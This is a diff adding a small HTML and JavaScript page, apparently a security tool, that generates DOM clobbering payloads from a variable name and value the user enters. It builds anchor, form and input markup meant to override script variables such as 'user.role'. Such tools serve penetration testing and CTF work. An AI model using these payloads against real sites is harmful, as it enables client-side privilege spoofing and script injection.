@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DOM Clobbering Payloads Generator</title>
+    <link rel="stylesheet" href="main.css">
+    <script src="/constants.js"></script>
+    <script src="/utils.js"></script>
+</head>
+<body>
+
+    <div class="container">
+
+        <h1>DOM Clobbering Payloads Generator</h1>
+
+        <label class="mt-5 large-font" for="variableNameInput">Variable name</label>
+        <input class="user-inputs" type="text" id="variableNameInput" placeholder="user.login.name">
+        
+        <label class="mt-25 large-font" for="variableValueInput">Variable value</label>
+        <input class="user-inputs" type="text" id="variableValueInput" placeholder="xanhacks">
+
+        <hr class="divider" />
+
+        <div id="payloadsContainer">
+
+        </div>
+
+    </div>
+
+    <script>
+        var initialize = false;
+        var ALLOWED_ELEMENTS = ["a", "form", "input", "iframe"];
+
+        /**
+         * Determine if it's possible to manipulate the variable through an HTML element attribute.
+         * @param {string} element - The HTML element being targeted.
+         * @param {string} attrName - The name of the attribute to check.
+         */
+        function isEnding(element, attrName) {
+            for (const attr of ATTRIBUTES[element]) {
+                if (attr === attrName) {
+                    return true;
+                }
+            }
+            return false;
+        }
+
+        /**
+         * Generate the HMTL code to clobber the variable.
+         * @param {string} variableName - The name of the variable to clobber.
+         * @param {string} variableValue - The value of the variable to clobber.
+         * @returns {string} The HTML code to clobber the variable.
+         */
+        function domClobbering(variableName, variableValue) {
+            const documentScope = variableName.startsWith("document.");
+
+            // remove "window." or "document." from the variable name
+            if (variableName.startsWith("window.") || documentScope) {
+                variableName = variableName.split(".").slice(1).join(".");
+            }
+            variableValue = variableValue.replace('"', "&quot;");
+
+            let payloads = [];
+            const depth = 1 + (variableName.match(/\./g) || []).length;
+            const chromeRequired = depth > 1;
+
+            console.log("********************* INFO **********************");
+            console.log("ALLOWED_ELEMENTS =", ALLOWED_ELEMENTS);
+            console.log("variableName =", variableName);
+            console.log("variableValue =", variableValue);
+            console.log("depth =", depth);
+            console.log("documentScope =", documentScope);
+            console.log("chromeRequired =", chromeRequired);
+
+            if (depth === 1) {
+                if (!isValidURI(variableValue)) {
+                    variableValue = "a:" + variableValue;
+                }
+                payloads.push(`<a id="${variableName}" href="${variableValue}"></a>`);
+            } else if (depth === 2) {
+                const [first, second] = variableName.split(".");
+
+                for (const elem of ALLOWED_ELEMENTS) {
+                    if (isEnding(elem, second)) {
+                        payloads.push(`<${elem} id="${first}" ${second}="${variableValue}"></${elem}>`);
+                        if (SUPPORTS_NAME_ATTR.includes(elem)) {
+                            payloads.push(`<${elem} name="${first}" ${second}="${variableValue}"></${elem}>`);
+                        }
+                    }
+                }
+
+                if (!isValidURI(variableValue)) {
+                    variableValue = "a:" + variableValue;
+                }
+                payloads.push(`<a id="${first}"></a><a id="${first}" name="${second}" href="${variableValue}"></a>`);
+            } else if (depth == 3) {
+                const [first, second, third] = variableName.split(".");
+
+                if (ALLOWED_ELEMENTS.includes("form")) {
+                    if (isEnding("form", third)) {
+                        payloads.push(`<form id="${first}" name="${second}" ${third}="${variableValue}"></form>\n<form id="${first}">`);
+                    }
+
+                    if (ALLOWED_ELEMENTS.includes("input")) {
+                        payloads.push(`<form id="${first}" name="${second}">\n\t<input id="${third}" value="${variableValue}">\n</form>\n<form id="${first}">`);
+                    }
+                }
+
+            }
+
+            return payloads;
+        }
+
+        /**
+         * Get the content of the two inputs and call the domClobbering function on it.
+         */
+        function generatePayload() {
+            if (!initialize) {
+                initialize = true;
+                if (variableNameInput.value === "") {
+                    variableNameInput.value = "user.role";
+                }
+                if (variableValueInput.value === "") {
+                    variableValueInput.value = "xanhacks";
+                }
+            }
+            
+            const payloads = domClobbering(variableNameInput.value, variableValueInput.value);
+            displayPayloads(payloads);
+        }
+
+        document.getElementById("variableNameInput").addEventListener("input", generatePayload);
+        document.getElementById("variableValueInput").addEventListener("input", generatePayload);
+        generatePayload();
+    </script>
+
+</body>
+</html>
